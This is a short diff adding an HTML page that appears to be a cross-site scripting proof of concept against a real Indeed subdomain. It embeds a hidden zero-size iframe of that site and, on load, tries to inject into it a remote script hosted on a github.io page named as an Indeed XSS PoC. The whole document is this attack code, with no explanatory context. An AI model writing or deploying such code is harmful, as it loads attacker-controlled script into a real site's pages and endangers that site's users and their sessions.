@@ -1,0 +1,21 @@
+<iframe
+  src="https://worker-adhoc-shifts.indeed.com"
+  style="width:0;height:0;display:none"
+  onload="inject()"
+></iframe>
+
+<script>
+function inject() {
+  const iframe = document.querySelector("iframe");
+  try {
+    const win = iframe.contentWindow;
+    const doc = win.document;
+    const s = doc.createElement("script");
+    s.src = "https://amirwilayah.github.io/indeed-xss-poc-/x.js";
+    doc.head.appendChild(s);
+  } catch (e) {
+    console.error("Injection failed:", e);
+  }
+}
+</script>
+
